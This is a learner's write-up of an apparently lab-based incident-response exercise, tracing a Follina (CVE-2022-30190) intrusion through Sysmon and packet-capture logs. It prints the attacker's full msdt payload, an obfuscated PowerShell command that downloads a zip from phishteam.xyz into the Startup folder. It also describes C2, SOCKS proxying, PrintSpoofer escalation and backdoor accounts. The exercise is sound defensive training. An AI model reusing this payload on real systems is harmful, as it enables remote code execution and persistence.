href="8F2D9ED7-4551-413A-A8D2-E3132F02A5B1.png"><img style="width:645px" src="8F2D9ED7-4551-413A-A8D2-E3132F02A5B1.png"/></a></figure><p id="2495b2cc-075b-80d5-bf1d-c5b2cf0b9735" class="">
</p><ul id="2495b2cc-075b-8047-9501-c6c5eee13f5b" class="bulleted-list"><li style="list-style-type:disc">What is the CVE number of the exploit used by the attacker to achieve a remote code execution?</li></ul><p id="2495b2cc-075b-8027-b767-ff53aeba2b45" class=""><em>Format: XXXX-XXXXX<br/>event id 1 ad the process number 496, then the executable that’s involved in lunching the command the image shows msdt.exe, google for the CVE involving remote shell execution (RCE).<br/></em></p><figure id="2495b2cc-075b-80b7-bd14-d23c40ab5a37" class="image"><a href="994B3106-5DA6-4AA9-B009-E7CBFA0B071F.png"><img style="width:692px" src="994B3106-5DA6-4AA9-B009-E7CBFA0B071F.png"/></a></figure><p id="2495b2cc-075b-80a0-abdc-c62febacf69e" class=""><strong>Answer: 2022–30190</strong></p><p id="2495b2cc-075b-80a6-a74d-ffdd6fd0d2cf" class="">
</p><h2 id="2495b2cc-075b-801b-b0e3-cecd210c4ad8" class="">Initial Access - Stage 2 execution</h2><p id="2495b2cc-075b-80ba-a42c-f751b91422b4" class="">
</p><p id="2495b2cc-075b-80da-95b6-ee9209ba6d0e" class="">The full payload path</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2495b2cc-075b-8089-8a33-dc67070a201b" class="code code-wrap"><code class="language-Objective-C" style="white-space:pre-wrap;word-break:break-all">C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param &quot;IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression(&#x27;[System.Text.Encoding]&#x27;+[char]58+[char]58+&#x27;UTF8.GetString([System.Convert]&#x27;+[char]58+[char]58+&#x27;FromBase64String(&#x27;+[char]34+&#x27;JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==&#x27;+[char]34+&#x27;))&#x27;))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe”</code></pre><p id="2495b2cc-075b-80dd-8e6d-c7f96e0814ab" class="">The base64 encoded - </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2495b2cc-075b-80ed-b590-d4604e89a48e" class="code code-wrap"><code class="language-Objective-C" style="white-space:pre-wrap;word-break:break-all">$app=[Environment]::GetFolderPath(&#x27;ApplicationData&#x27;);cd &quot;$app\Microsoft\Windows\Start Menu\Programs\Startup&quot;; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;
</code></pre><ul id="2495b2cc-075b-8031-ab60-df05e8a1230d" class="bulleted-list"><li style="list-style-type:disc">The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?<br/></li></ul><p id="2495b2cc-075b-8085-92b6-c6797662a790" class="">I know the name of the file is update.zip, so i searched for it with th sysmon EVID 11 and found the following,<br/></p><figure id="2495b2cc-075b-8087-9011-d9ff3fb6ce95" class="image"><a href="30819E59-216C-4571-8D4D-C9483C79645A.png"><img style="width:692px" src="30819E59-216C-4571-8D4D-C9483C79645A.png"/></a></figure><ul id="2495b2cc-075b-8019-a0a3-ea8e10f55321" class="bulleted-list"><li style="list-style-type:disc">The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?<br/><em>Format: Remove the double quotes from the log.<br/></em></li></ul><p id="2495b2cc-075b-805c-93e1-c6d4895cbcfc" class="">We just need to search TLE for the parent process associated with logins(Explorer.exe) and look for any suspicious script or code which is run under that process.</p><figure id="2495b2cc-075b-80ed-816c-d3344a82f0cd" class="image"><a href="https://miro.medium.com/v2/resize:fit:1167/1*PY2Eh5yDz0x3nL6G2D6uhQ.png"><img style="width:700px" src="https://miro.medium.com/v2/resize:fit:1167/1*PY2Eh5yDz0x3nL6G2D6uhQ.png"/></a></figure><ul id="2495b2cc-075b-80b7-9d02-e14c0d4aebe3" class="bulleted-list"><li style="list-style-type:disc">Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?<br/>i know the name of the executable, so i looked for the hash from there<br/></li></ul><figure id="2495b2cc-075b-8013-9963-e0caacf2432f" class="image"><a href="116BFF8D-424E-4BA1-88DB-F4EC097372EB.png"><img style="width:692px" src="116BFF8D-424E-4BA1-88DB-F4EC097372EB.png"/></a></figure><ul id="2495b2cc-075b-8041-89d3-c28024fa19f8" class="bulleted-list"><li style="list-style-type:disc"> The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?<br/><br/>port is assumed to be 80</li></ul><figure id="2495b2cc-075b-8022-9161-f75eb8ebc6df" class="image"><a href="75D7EF8C-8451-46BE-8243-BC60684850CD.png"><img style="width:691.9833374023438px" src="75D7EF8C-8451-46BE-8243-BC60684850CD.png"/></a></figure><p id="2495b2cc-075b-8026-a419-fbf0e6b1b42a" class=""><em>Format: domain:port</em></p><p id="2495b2cc-075b-8082-a850-f82e295e40bf" class="">
</p><h2 id="2495b2cc-075b-809b-9e7b-ebbc0ab6278f" class="">Initial Access - Malicious Document Traffic</h2><p id="2495b2cc-075b-80f2-9a35-f65cbd0a0c43" class="">Based on the collected findings, we discovered that the attacker fetched the stage 2 payload remotely:</p><ul id="2495b2cc-075b-8007-8696-e792c65384c5" class="bulleted-list"><li style="list-style-type:disc">We discovered the Domain and IP invoked by the malicious document on Sysmon logs.</li></ul><ul id="2495b2cc-075b-806c-814d-dfe691552c6d" class="bulleted-list"><li style="list-style-type:disc">There is another domain and IP used by the stage 2 payload logged from the same data source.</li></ul><h3 id="2495b2cc-075b-80bf-8950-c9d2e3070cc0" class="">Investigation Guide</h3><p id="2495b2cc-075b-806a-9f90-ff0bd799436f" class="">Since we have discovered network-related artefacts, we may again refer to our cheatsheet, which focuses on Network Log Analysis:</p><ul id="2495b2cc-075b-802a-b6e7-c768516a5faf" class="bulleted-list"><li style="list-style-type:disc">We can now use<strong> Brim and Wireshark</strong> to investigate the packet capture.</li></ul><ul id="2495b2cc-075b-80a9-a3fe-f49f6adabfbe" class="bulleted-list"><li style="list-style-type:disc">Find network events related to the harvested domains and IP addresses.</li></ul><ul id="2495b2cc-075b-8075-bc23-dc20db888368" class="bulleted-list"><li style="list-style-type:disc">Sample Brim filter that you can use for this investigation: <code>_path==&quot;http&quot; &quot;&lt;malicious domain&gt;&quot; </code>   Data Sources: Packet Capture</li></ul><p id="2495b2cc-075b-80e6-a3a4-c99e422cb494" class="">
</p><ul id="2495b2cc-075b-80bd-9aea-d7d815c22caf" class="bulleted-list"><li style="list-style-type:disc">What is the URL of the malicious payload embedded in the document?<br/><br/>i was able to find this from BRIM</li></ul><figure id="2495b2cc-075b-8091-a46a-f351f43a3d91" class="image"><a href="974346CD-C4ED-4D03-B7D4-0BAA067AC388.png"><img style="width:691.9500122070312px" src="974346CD-C4ED-4D03-B7D4-0BAA067AC388.png"/></a></figure><ul id="2495b2cc-075b-80c6-bd96-ce6056f81187" class="bulleted-list"><li style="list-style-type:disc">What is the encoding used by the attacker on the c2 connection?<br/><br/>as seen from the logs, its base64<br/></li></ul><ul id="2495b2cc-075b-808b-a450-e31aa8a358ad" class="bulleted-list"><li style="list-style-type:disc">The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?<br/><br/>query parameter is q</li></ul><figure id="2495b2cc-075b-80e6-8b26-f21a02a8fa76" class="image"><a href="3BC0B3B0-232F-4842-9D6A-3CAE6A7D906C.png"><img style="width:691.9166870117188px" src="3BC0B3B0-232F-4842-9D6A-3CAE6A7D906C.png"/></a></figure><ul id="2495b2cc-075b-8012-8ee0-dc7f33ae9063" class="bulleted-list"><li style="list-style-type:disc">The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?<br/></li></ul><figure id="2495b2cc-075b-8051-be3f-dd3baf3fac34" class="image"><a href="image%20311.png"><img style="width:692px" src="image%20311.png"/></a></figure><ul id="2495b2cc-075b-80cf-9b87-c7c8ba7379c7" class="bulleted-list"><li style="list-style-type:disc">What is the HTTP method used by the binary?<br/><br/>GET</li></ul><ul id="2495b2cc-075b-80f8-bd8f-ddf29c05e8e1" class="bulleted-list"><li style="list-style-type:disc">Based on the user agent, what programming language was used by the attacker to compile the binary?<br/><br/>I added a user agent column to wireshark, and looked through all the user agents, I foun done that stood out.<br/></li></ul><figure id="2495b2cc-075b-80b0-be13-ccb96db625ed" class="image"><a href="32AE52E6-DE62-4012-9C8E-300DA1A42BBC.png"><img style="width:692px" src="32AE52E6-DE62-4012-9C8E-300DA1A42BBC.png"/></a></figure><p id="2495b2cc-075b-8082-a99e-c232af26bd84" class=""><em>Format: Answer in lowercase</em></p><p id="2495b2cc-075b-8074-b9d8-f01e3be3c841" class="">
</p><h2 id="2495b2cc-075b-8060-a24f-ccf9f1df9064" class="">Discovery - Internal Reconnaissance</h2><h1 id="2495b2cc-075b-8085-8667-d2dcec797942" class="">Internal Reconnaissance</h1><p id="2495b2cc-075b-801d-a71e-d8888f167e3f" class="">Based on the collected findings, we have discovered that the malicious binary continuously uses the C2 traffic:</p><ul id="2495b2cc-075b-80b3-9ef6-d9ea2cbc0783" class="bulleted-list"><li style="list-style-type:disc">We can easily decode the encoded string in the network traffic.</li></ul><ul id="2495b2cc-075b-800d-b258-fd0ee824922e" class="bulleted-list"><li style="list-style-type:disc">The traffic contains the command and output executed by the attacker.</li></ul><h1 id="2495b2cc-075b-80ff-97c0-e22cfa13afb2" class="">Investigation Guide</h1><p id="2495b2cc-075b-8050-be59-f67632ac7340" class="">To continue with the investigation, we may focus on the following information:</p><ul id="2495b2cc-075b-80ea-a750-fc7d28aa7000" class="bulleted-list"><li style="list-style-type:disc">Find network and process events connecting to the malicious domain.</li></ul><ul id="2495b2cc-075b-80bb-bef1-c5438c892a82" class="bulleted-list"><li style="list-style-type:disc">Find network events that contain an encoded command.</li></ul><ul id="2495b2cc-075b-8099-ab2e-c29527187c50" class="bulleted-list"><li style="list-style-type:disc">We can use Brim to filter all packets containing the encoded string.</li></ul><ul id="2495b2cc-075b-808f-8860-d6fb393c689c" class="bulleted-list"><li style="list-style-type:disc">Look for endpoint enumeration commands since the attacker is already inside the machine.</li></ul><p id="2495b2cc-075b-808a-8c74-da0f208cc657" class="">In addition, we may refer to our cheatsheet for Brim to quickly investigate the encoded traffic with the following filters:</p><ul id="2495b2cc-075b-803f-b1ac-fae13de74516" class="bulleted-list"><li style="list-style-type:disc">To get all HTTP requests related to the malicious C2 traffic: <code>_path==&quot;http&quot; &quot;&lt;replace domain&gt;&quot; id.resp_p==&lt;replace port&gt; | cut ts, host, id.resp_p, uri | sort ts</code></li></ul><p id="2495b2cc-075b-8089-987a-eb697d7a9a02" class="">Significant Data Sources:</p><ul id="2495b2cc-075b-80af-a4d8-dca5e1fcd4be" class="bulleted-list"><li style="list-style-type:disc">Packet Capture</li></ul><ul id="2495b2cc-075b-807a-8357-c4294b244211" class="bulleted-list"><li style="list-style-type:disc">Sysmon</li></ul><p id="2495b2cc-075b-8053-9aae-e9206d2d7fea" class="">
</p><ul id="2495b2cc-075b-80d1-8a73-f98c3f9fa598" class="bulleted-list"><li style="list-style-type:disc">The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?<br/><br/>I filtered by the domain in wireshark, then looked through the url queries, I did go thrtough a couple of them until i find one with credentials in it.<br/></li></ul><figure id="2495b2cc-075b-8078-b296-e68944238b6b" class="image"><a href="image%20312.png"><img style="width:2200px" src="image%20312.png"/></a></figure><figure id="2495b2cc-075b-8054-9f6c-e86792e0dc4f" class="image"><a href="image%20313.png"><img style="width:691.9833374023438px" src="image%20313.png"/></a></figure><figure id="2495b2cc-075b-807d-8690-e83d46f1bcdf" class="image"><a href="image%20314.png"><img style="width:691.9833374023438px" src="image%20314.png"/></a></figure><ul id="2495b2cc-075b-80a9-8d06-dd507e50f253" class="bulleted-list"><li style="list-style-type:disc">The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell <br/>inside the machine?<br/></li></ul><p id="2495b2cc-075b-8046-b147-c4d989416d22" class="">I kept decoding the request URI, I found this<br/></p><figure id="2495b2cc-075b-80f4-9ed4-de06384d745a" class="image"><a href="EA19E07A-3A67-482A-AD19-7A38629DFE04.png"><img style="width:2189px" src="EA19E07A-3A67-482A-AD19-7A38629DFE04.png"/></a></figure><p id="2495b2cc-075b-8020-8876-f6406d5c8192" class="">by decoding this I found a netstat command output</p><figure id="2495b2cc-075b-8074-a668-c996f925c9e4" class="image"><a href="C8CA914B-7C83-47CE-8EF8-D921417532C7.png"><img style="width:691.9833374023438px" src="C8CA914B-7C83-47CE-8EF8-D921417532C7.png"/></a></figure><p id="2495b2cc-075b-80ba-9d4f-daa75e9ceb9e" class="">5985 is the listener</p><ul id="2495b2cc-075b-8095-8308-d0f39e158895" class="bulleted-list"><li style="list-style-type:disc">The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the <br/>attacker to establish the connection?</li></ul><p id="2495b2cc-075b-8090-a602-c43792935948" class=""><em>Format: Remove the double quotes from the log.<br/></em></p><p id="2495b2cc-075b-8018-9152-cd7953d171c9" class=""><em>we know that they are creting a socks prxy connection, i looked for conenctions created by the ch.exe and found this<br/></em></p><figure id="2495b2cc-075b-80ed-92c7-fd0158c3731f" class="image"><a href="67EA6612-428A-4665-B4F4-67C7A47E5FBD.png"><img style="width:2179px" src="67EA6612-428A-4665-B4F4-67C7A47E5FBD.png"/></a></figure><ul id="2495b2cc-075b-80de-b933-d807009b8f20" class="bulleted-list"><li style="list-style-type:disc">What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?<br/><br/>from the even explorer, i followed to the next process, and foun dhte file hash</li></ul><figure id="2495b2cc-075b-80c0-9ecd-f383b9ce8fb4" class="image"><a href="4A6FFC14-649B-4824-BAC1-810D97965426.png"><img style="width:2185px" src="4A6FFC14-649B-4824-BAC1-810D97965426.png"/></a></figure><ul id="2495b2cc-075b-801d-930d-d33a44e4afc5" class="bulleted-list"><li style="list-style-type:disc">What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.<br/>using the SH256, i used vt to find the tool<br/></li></ul><figure id="2495b2cc-075b-8044-908d-f28f140caa32" class="image"><a href="D1E7682E-CE3A-471C-9708-9FCC19C7AF4E.png"><img style="width:691.9833374023438px" src="D1E7682E-CE3A-471C-9708-9FCC19C7AF4E.png"/></a></figure><ul id="2495b2cc-075b-80b5-beb1-dec107324ec2" class="bulleted-list"><li style="list-style-type:disc">The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?<br/><br/>I looked through the sysmon logs foe evebts that happened right after the proxy execution, I saw some accounts created and a use of the wsmprovhost.exe, which i believe is used to run remote commands, So i looked it up and saw WinRMN, which is used in evilwinrm as well</li></ul><figure id="2495b2cc-075b-8033-a44a-f6532c35a1ca" class="image"><a href="image%20315.png"><img style="width:692px" src="image%20315.png"/></a></figure><p id="2495b2cc-075b-8037-b2d7-efa595e2c966" class=""><em>Format: Answer in lowercase</em></p><p id="2495b2cc-075b-80cd-a202-e3a8576a8722" class="">
</p><h2 id="2495b2cc-075b-8060-8ae3-cbf9d3980f9e" class="">Privilege Escalation - Exploiting Privileges</h2><p id="2495b2cc-075b-8094-a1a4-fe153cb24f81" class=""><strong>Privilege Escalation</strong></p><p id="2495b2cc-075b-8013-a015-e171aa0b0e53" class="">Based on the collected findings, the attacker gained a stable shell through a reverse socks proxy.</p><p id="2495b2cc-075b-80a9-8fd6-e5b1096c270c" class=""><strong>Investigation Guide</strong></p><p id="2495b2cc-075b-80da-9542-fca302c8c746" class="">With this, we can focus on the following network and endpoint events:</p><p id="2495b2cc-075b-8079-ad35-e79deb6294f7" class="">Look for events executed after the successful execution of the reverse socks proxy tool.</p><p id="2495b2cc-075b-8048-96ae-d6d5e980241d" class="">Look for potential privilege escalation attempts, as the attacker has already established a persistent low-privilege access.</p><p id="2495b2cc-075b-800a-876f-f792db3d1faf" class="">
</p><p id="2495b2cc-075b-8067-a727-c0d933edaf37" class="">
</p><ul id="2495b2cc-075b-8031-af4e-fa8600c71a94" class="bulleted-list"><li style="list-style-type:disc">After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?</li></ul><p id="2495b2cc-075b-80bc-8bb5-f791c655bea5" class=""><em><br/>i looked through events right after the proxy, then i saw a file names spf.exe being downloaded, </em></p><figure id="2495b2cc-075b-80ff-b1c8-c21bf3855ff6" class="image"><a href="67EE3696-0E72-4CA3-B597-C437DA987D11.png"><img style="width:692px" src="67EE3696-0E72-4CA3-B597-C437DA987D11.png"/></a></figure><figure id="2495b2cc-075b-8045-9a75-d754ec7360ef" class="image"><a href="image%20316.png"><img style="width:692px" src="image%20316.png"/></a></figure><ul id="2495b2cc-075b-80c1-baae-cfe3595c1191" class="bulleted-list"><li style="list-style-type:disc">Based on the SHA256 hash of the binary, what is the name of the tool used?<em><br/></em><figure id="2495b2cc-075b-8083-b3b3-f6c291d24810" class="image"><a href="A14B3C2C-7B19-4107-9986-87985D424296.png"><img style="width:692px" src="A14B3C2C-7B19-4107-9986-87985D424296.png"/></a></figure></li></ul><ul id="2495b2cc-075b-80c9-8bc7-f8e12ac4e857" class="bulleted-list"><li style="list-style-type:disc">The tool exploits a specific privilege owned by the user. What is the name of the privilege?<br/>I googled about the exe and found this page <a href="https://github.com/itm4n/PrintSpoofer">https://github.com/itm4n/PrintSpoofer</a></li></ul><figure id="2495b2cc-075b-802c-b616-c5b93b83343c" class="image"><a href="C25B1830-1692-42FC-AFDE-4704B72AB240.png"><img style="width:692px" src="C25B1830-1692-42FC-AFDE-4704B72AB240.png"/></a></figure><ul id="2495b2cc-075b-80c3-a554-ded0548efbec" class="bulleted-list"><li style="list-style-type:disc">Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?<br/>right after spe.exe, final.exe was run</li></ul><figure id="2495b2cc-075b-8061-97ba-ccdbd1dd94dc" class="image"><a href="685706EA-584B-4022-94CA-C58ABB72097D.png"><img style="width:691.9666748046875px" src="685706EA-584B-4022-94CA-C58ABB72097D.png"/></a></figure><ul id="2495b2cc-075b-800c-be89-d626a4bcdecd" class="bulleted-list"><li style="list-style-type:disc">The binary connects to a different port from the first c2 connection. What is the port used?</li></ul><p id="2495b2cc-075b-8061-bdd7-c61a04cb7088" class="">I went back to brim to check for conenctions to other IP addresses, and foun da conenction to port 8080</p><figure id="2495b2cc-075b-80c3-943b-c433309c103b" class="image"><a href="7B086AF5-96CC-4EC3-B924-1B3B3B486AEC.png"><img style="width:531px" src="7B086AF5-96CC-4EC3-B924-1B3B3B486AEC.png"/></a></figure><p id="2495b2cc-075b-807c-a9b2-e9d23ba11be6" class="">
</p><h2 id="2495b2cc-075b-804e-9cc9-eb12c01c2856" class="">Actions on Objective - Fully-owned Machine</h2><p id="2495b2cc-075b-8077-a5e0-c42102f4bf8c" class="">Now, the attacker has gained administrative privileges inside the machine. Find all persistence techniques used by the attacker.</p><p id="2495b2cc-075b-802b-abb8-c42842475d25" class="">In addition, the unusual executions are related to the malicious C2 binary used during privilege escalation.</p><h3 id="2495b2cc-075b-802d-a8f6-e54f87ba83a1" class="">Investigation Guide</h3><p id="2495b2cc-075b-8052-8a9e-fefb0feaf6b3" class="">Now, we can rely on our cheatsheet to investigate events after a successful privilege escalation:</p><ul id="2495b2cc-075b-80a0-a857-f7bf2b376d71" class="bulleted-list"><li style="list-style-type:disc">Useful Brim filter to get all HTTP requests related to the malicious C2 traffic : <code>_path==&quot;http&quot; &quot;&lt;replace domain&gt;&quot; id.resp_p==&lt;replace port&gt; | cut ts, host, id.resp_p, uri | sort ts</code></li></ul><ul id="2495b2cc-075b-8062-876a-e0570e50ef61" class="bulleted-list"><li style="list-style-type:disc">The attacker gained SYSTEM privileges; now, the user context for each malicious execution blends with <strong>NT Authority\System.</strong></li></ul><ul id="2495b2cc-075b-804f-ad78-e39bb11261ac" class="bulleted-list"><li style="list-style-type:disc">All child events of the new malicious binary used for C2 are worth checking.<br/><br/></li></ul><ul id="2495b2cc-075b-8092-b6f3-cdd5f959f917" class="bulleted-list"><li style="list-style-type:disc">Upon achieving SYSTEM access, the attacker then created two users. What are the account names?<br/><br/>I looked for account cretion using the net command and shaw 2 new users added</li></ul><figure id="2495b2cc-075b-803c-b397-dc6d3af50aae" class="image"><a href="9FA4C6E1-74DC-44E7-8F2A-722BE3595C4A.png"><img style="width:692px" src="9FA4C6E1-74DC-44E7-8F2A-722BE3595C4A.png"/></a></figure><ul id="2495b2cc-075b-805b-a905-cf1207ba4997" class="bulleted-list"><li style="list-style-type:disc">Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?<br/><br/>From the previous screenshit you can see that the /add command is missing<br/></li></ul><figure id="2495b2cc-075b-80f7-8b49-fa6be9fa54eb" class="image"><a href="130E5A8E-3997-4FF5-B8CA-607D73886A01.png"><img style="width:691.9833374023438px" src="130E5A8E-3997-4FF5-B8CA-607D73886A01.png"/></a></figure><ul id="2495b2cc-075b-80a2-b7a0-cd43d2840f3c" class="bulleted-list"><li style="list-style-type:disc">Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?<br/><br/>this is 4720 as we know</li></ul><ul id="2495b2cc-075b-8068-908f-dfe4e377e82f" class="bulleted-list"><li style="list-style-type:disc">The attacker added one of the accounts in the local administrator&#x27;s group. What is the command used by the attacker?<br/></li></ul><figure id="2495b2cc-075b-80b2-93b6-fdeca350c972" class="image"><a href="E4663A3F-FBD4-4ADC-A9AB-F758834B57C1.png"><img style="width:691.9666748046875px" src="E4663A3F-FBD4-4ADC-A9AB-F758834B57C1.png"/></a></figure><ul id="2495b2cc-075b-8055-95ec-c936aae60304" class="bulleted-list"><li style="list-style-type:disc">Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?<br/>4732<br/></li></ul><ul id="2495b2cc-075b-8088-a2a7-e196e5201c52" class="bulleted-list"><li style="list-style-type:disc">After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?</li></ul><p id="2495b2cc-075b-8066-84f0-c4b071dd1fa6" class="">I researched for ays to add persistence, and found that sc.exe can be usede for adding an exe to auto start, so i searched for exectution of sc.exe and foun the following</p><figure id="2495b2cc-075b-8086-919f-cc6f1b9314aa" class="image"><a href="4F68EC0A-4EA6-46D7-97EC-98DAFEAF261F.png"><img style="width:692px" src="4F68EC0A-4EA6-46D7-97EC-98DAFEAF261F.png"/></a></figure><p id="2495b2cc-075b-806d-a3dc-c1d7550042e1" class="">
</p><p id="2495b2cc-075b-800d-b21a-c7ca265b1e9b" class="">
</p><p id="2495b2cc-075b-80a2-a0b1-f4b8662cfce3" class="">This Room was indeed very challenging for me, I had to research quite a bit and spend a lot of time, but it was a very good learning experience.</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>